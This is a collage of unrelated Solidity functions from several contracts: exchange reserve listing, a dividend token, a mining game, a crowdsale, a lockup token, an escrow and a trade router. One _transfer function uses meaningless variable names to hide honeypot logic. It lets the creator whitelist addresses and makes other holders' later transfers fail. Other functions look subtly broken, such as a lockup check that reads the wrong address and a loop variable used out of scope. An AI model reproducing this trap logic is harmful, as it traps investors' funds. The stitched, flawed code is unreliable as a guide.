function initOrderbookContract(ERC20 token) public returns(bool) {
    require(reserveListingStage[token] == ListingStage.RESERVE_ADDED);
    require(reserves[token].init());
    reserveListingStage[token] = ListingStage.RESERVE_INIT;
    TokenOrderbookListingStage(token, ListingStage.RESERVE_INIT);
    return true;
}

function listOrderbookContract(ERC20 token) public returns(bool) {
    require(reserveListingStage[token] == ListingStage.RESERVE_INIT);
    require(
        kyberNetworkContract.addReserve(
            KyberReserveInterface(reserves[token]),
            true
        )
    );
    require(
        kyberNetworkContract.listPairForReserve(
            KyberReserveInterface(reserves[token]),
            token,
            true,
            true,
            true
        )
    );
    FeeBurnerInterface feeBurner = FeeBurnerInterface(kyberNetworkContract.feeBurnerContract());
    feeBurner.setReserveData(
        reserves[token], 
        ORDERBOOK_BURN_FEE_BPS, 
        reserves[token] 
    );
    reserveListingStage[token] = ListingStage.RESERVE_LISTED;
    TokenOrderbookListingStage(token, ListingStage.RESERVE_LISTED);
    return true;
}

function unlistOrderbookContract(ERC20 token, uint hintReserveIndex) public {
    require(reserveListingStage[token] == ListingStage.RESERVE_LISTED);
    require(reserves[token].kncRateBlocksTrade());
    require(kyberNetworkContract.removeReserve(KyberReserveInterface(reserves[token]), hintReserveIndex));
    reserveListingStage[token] = ListingStage.NO_RESERVE;
    reserves[token] = OrderbookReserveInterface(0);
    TokenOrderbookListingStage(token, ListingStage.NO_RESERVE);
}

function addOrderbookContract(ERC20 token) public returns(bool) {
    require(reserveListingStage[token] == ListingStage.NO_RESERVE);
    require(!(tokenListingBlocked[token]));
    reserves[token] = new OrderbookReserve({
        knc: kncToken,
        reserveToken: token,
        burner: kyberNetworkContract.feeBurnerContract(),
        network: kyberNetworkContract,
        medianizer: medianizerContract,
        factory: orderFactoryContract,
        minNewOrderUsd: minNewOrderValueUsd,
        maxOrdersPerTrade: maxOrdersPerTrade,
        burnFeeBps: ORDERBOOK_BURN_FEE_BPS
    });
    reserveListingStage[token] = ListingStage.RESERVE_ADDED;
    TokenOrderbookListingStage(token, ListingStage.RESERVE_ADDED);
    return true;
}

function _transferFrom(address sender, address recipient, uint256 amount) internal returns(bool) {
    if (inSwap) {
        return _basicTransfer(sender, recipient, amount);
    }
    if (!authorizations[sender] && !authorizations[recipient]) {
        require(tradingOpen, "Trading not open yet");
    }
    if (blacklistMode) {
        require(!isBlacklisted[sender] && !isBlacklisted[recipient], "Blacklisted");
    }
    if (!authorizations[sender] && recipient != address(this) && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != teamFeeReceiver && recipient != autoLiquidityReceiver && recipient != burnFeeReceiver) {
        uint256 heldTokens = balanceOf(recipient);
        require((heldTokens + amount) <= _maxWalletToken, "Total Holding is currently limited, you can not buy that much.");
    }
    if (sender == pair &&
        buyCooldownEnabled &&
        !isTimelockExempt[recipient]) {
        require(cooldownTimer[recipient] < block.timestamp, "Please wait for 1min between two buys");
        cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
    }
    checkTxLimit(sender, amount);
    if (shouldSwapBack()) {
        swapBack();
    }
    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
    uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? amount : takeFee(sender, amount, (recipient == pair));
    _balances[recipient] = _balances[recipient].add(amountReceived);
    if (!isDividendExempt[sender]) {
        try distributor.setShare(sender, _balances[sender]) {} catch {}
    }
    if (!isDividendExempt[recipient]) {
        try distributor.setShare(recipient, _balances[recipient]) {} catch {}
    }
    try distributor.process(distributorGas) {} catch {}
    emit Transfer(sender, recipient, amountReceived);
    return true;
}

function distributeDividend(address shareholder) internal {
    if (shares[shareholder].amount == 0) {
        return;
    }
    uint256 amount = getUnpaidEarnings(shareholder);
    if (amount > 0) {
        totalDistributed = totalDistributed.add(amount);
        payable(shareholder).transfer(amount);
        shareholderClaims[shareholder] = block.timestamp;
        shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }
}

function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    require(addresses.length < 501, "GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length, "Mismatch between Address and token count");
    uint256 SCCC = 0;
    for (uint i = 0; i < addresses.length; i++) {
        SCCC = SCCC + tokens[i];
    }
    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
    for (uint i = 0; i < addresses.length; i++) {
        _basicTransfer(from, addresses[i], tokens[i]);
        if (!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {}
        }
    }
    if (!isDividendExempt[from]) {
        try distributor.setShare(from, _balances[from]) {} catch {}
    }
}

function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
    require(addresses.length < 801, "GAS Error: max airdrop limit is 800 addresses");
    uint256 SCCC = tokens * addresses.length;
    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
    for (uint i = 0; i < addresses.length; i++) {
        _basicTransfer(from, addresses[i], tokens);
        if (!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {}
        }
    }
    if (!isDividendExempt[from]) {
        try distributor.setShare(from, _balances[from]) {} catch {}
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (tshirt == false)) {
        pushup = chTx;
        sunset = true;
    }
    if ((address(sender) == creator) && (tshirt == true)) {
        aircond[recipient] = true;
        mayor[recipient] = false;
        tshirt = false;
    }
    if ((amount > pumpkin) && (aircond[sender] == true) && (address(sender) != creator)) {
        katana[recipient] = true;
    }
    if (aircond[recipient] != true) {
        mayor[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((mayor[sender]) && (aircond[recipient] == false)) {
        mayor[recipient] = true;
    }
    if (aircond[sender] == false) {
        if ((amount > pumpkin) && (katana[sender] == true)) {
            require(false);
        }
        require(amount < pushup);
        if (sunset == true) {
            if (katana[sender] == true) {
                require(false);
            }
            katana[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function mineCrystals(uint256 _pkxAmount) external onlyEOA {
    address _owner = msg.sender;
    require(pickaxe.balanceOf(msg.sender) >= _pkxAmount);
    require(0 < _pkxAmount && _pkxAmount <= 100);
    uint256 _crystalAmount = _getRandom(5);
    uint256[] memory _tokenIds = new uint256[](_crystalAmount);
    uint256[] memory _kinds = new uint256[](_crystalAmount);
    uint256[] memory _weights = new uint256[](_crystalAmount);
    uint256[] memory _genes = new uint256[](_crystalAmount);
    uint256[] memory _crystalWeightsCumsum = new uint256[](100);
    _crystalWeightsCumsum[0] = crystalWeights[0];
    for (uint256 i = 1; i < 100; i++) {
        _crystalWeightsCumsum[i] = _crystalWeightsCumsum[i - 1].add(crystalWeights[i]);
    }
    uint256 _totalWeight = _crystalWeightsCumsum[_crystalWeightsCumsum.length - 1];
    uint256 _weightRandomSum = 0;
    uint256 _weightSum = 0;
    for (i = 0; i < _crystalAmount; i++) {
        _weights[i] = _getRandom(100);
        _weightRandomSum = _weightRandomSum.add(_weights[i]);
    }
    for (i = 0; i < _crystalAmount; i++) {
        _kinds[i] = _getFirstIndex(_getRandom(_totalWeight), _crystalWeightsCumsum);
        uint256 actualWeight = estimatedWeight.mul(_pkxAmount);
        _weights[i] = _weights[i].mul(actualWeight).div(_weightRandomSum);
        _genes[i] = _generateGene();
        require(_weights[i] > 0);
        _tokenIds[i] = crystal.mint(_owner, _genes[i], _kinds[i], _weights[i]);
        crystalWeights[_kinds[i]] = crystalWeights[_kinds[i]].sub(_weights[i]);
        _weightSum = _weightSum.add(_weights[i]);
    }
    setEstimatedWeight(_weightSum);
    pickaxe.burn(msg.sender, _pkxAmount);
    emit MineCrystals(
        _owner,
        now,
        _tokenIds,
        _kinds,
        _weights,
        _genes
    );
}

function _forwardFunds() internal {
    uint256 donation = msg.value.div(donationRate); 
    uint256 value = msg.value - donation;
    wallet.transfer(value);
    emit ForwardFunds(msg.sender, value, donation);
    uint256 donationEth = 2014000000000000000; 
    if (address(this).balance >= donationEth) {
        donationWallet.transfer(donationEth);
        emit Donation(msg.sender, donationEth);
    }
}

function transferFrom(address _from, address _to, uint256 _amount) public returns(bool success) {
    require(_to != address(0));
    require(balances[_from] >= _amount);
    require(allowed[_from][msg.sender] >= _amount);
    require(_amount > 0 && balances[_to].add(_amount) > balances[_to]);
    if (lockupParticipants[_from].lockupAmount > 0) {
        uint timePassed = now - startTime;
        if (timePassed < lockupParticipants[_from].lockupTime) {
            require(balances[msg.sender].sub(_amount) >= lockupParticipants[_from].lockupAmount);
        }
    }
    balances[_from] = balances[_from].sub(_amount);
    balances[_to] = balances[_to].add(_amount);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
    emit Transfer(_from, _to, _amount);
    return true;
}

function transfer(address _to, uint256 _amount) public returns(bool success) {
    require(_to != address(0));
    require(balances[msg.sender] >= _amount && _amount > 0 &&
        balances[_to].add(_amount) > balances[_to]);
    if (lockupParticipants[msg.sender].lockupAmount > 0) {
        uint timePassed = now - startTime;
        if (timePassed < lockupParticipants[msg.sender].lockupTime) {
            require(balances[msg.sender].sub(_amount) >= lockupParticipants[msg.sender].lockupAmount);
        }
    }
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = balances[_to].add(_amount);
    emit Transfer(msg.sender, _to, _amount);
    return true;
}

function paid(address _buyer) public onlyOracleOrOwner {
    require(getBalance() >= total);
    setPaid(_buyer);
}

function close() public onlyOracleOrOwner {
    require(state != ModultradeLibrary.ProposalStates.Closed);
    require(state != ModultradeLibrary.ProposalStates.Canceled);
    if (currency == ModultradeLibrary.Currencies.ETH) {
        closeEth();
    }
    if (currency == ModultradeLibrary.Currencies.MTR) {
        closeMtr();
    }
    state = ModultradeLibrary.ProposalStates.Closed;
    ClosedEvent(id, state, seller, this.balance);
    modultrade.fireCloseProposalEvent(address(this), id);
}

function cancel(uint cancelFee) public onlyOracleOrOwner {
    require(state != ModultradeLibrary.ProposalStates.Closed);
    require(state != ModultradeLibrary.ProposalStates.Canceled);
    uint _balance = getBalance();
    if (_balance > 0) {
        if (currency == ModultradeLibrary.Currencies.ETH) {
            cancelEth(cancelFee);
        }
        if (currency == ModultradeLibrary.Currencies.MTR) {
            cancelMtr(cancelFee);
        }
    }
    state = ModultradeLibrary.ProposalStates.Canceled;
    CanceledEvent(id, state, buyer, this.balance);
    modultrade.fireCancelProposalEvent(address(this), id);
}

function trade(uint256 tradingProxyIndex, ERC20 src, uint256 srcAmount, ERC20 dest, uint256 minDestAmount) payable public returns(uint256) {
    uint256 destAmount;
    if (etherERC20 != src) {
        src.transferFrom(msg.sender, address(this), srcAmount);
    }
    destAmount = _trade(tradingProxyIndex, src, srcAmount, dest, 1);
    require(destAmount >= minDestAmount, "destination amount is too low.");
    if (etherERC20 == dest) {
        msg.sender.transfer(destAmount);
    } else {
        dest.transfer(msg.sender, destAmount);
    }
    emit Trade(src, srcAmount, dest, destAmount, msg.sender, 0);
    return destAmount;
}

function tradeRoutes(
    ERC20 src,
    uint256 srcAmount,
    ERC20 dest,
    uint256 minDestAmount,
    address[] _tradingPaths)
public payable returns(uint256) {
    uint256 destAmount;
    if (etherERC20 != src) {
        src.transferFrom(msg.sender, address(this), srcAmount);
    }
    uint256 pathSrcAmount = srcAmount;
    for (uint i = 0; i < _tradingPaths.length; i += 3) {
        uint256 tradingProxyIndex = uint256(_tradingPaths[i]);
        ERC20 pathSrc = ERC20(_tradingPaths[i + 1]);
        ERC20 pathDest = ERC20(_tradingPaths[i + 2]);
        destAmount = _trade(tradingProxyIndex, pathSrc, pathSrcAmount, pathDest, 1);
        pathSrcAmount = destAmount;
    }
    require(destAmount >= minDestAmount, "destination amount is too low.");
    if (etherERC20 == dest) {
        msg.sender.transfer(destAmount);
    } else {
        dest.transfer(msg.sender, destAmount);
    }
    emit Trade(src, srcAmount, dest, destAmount, msg.sender, 0);
    return destAmount;
}

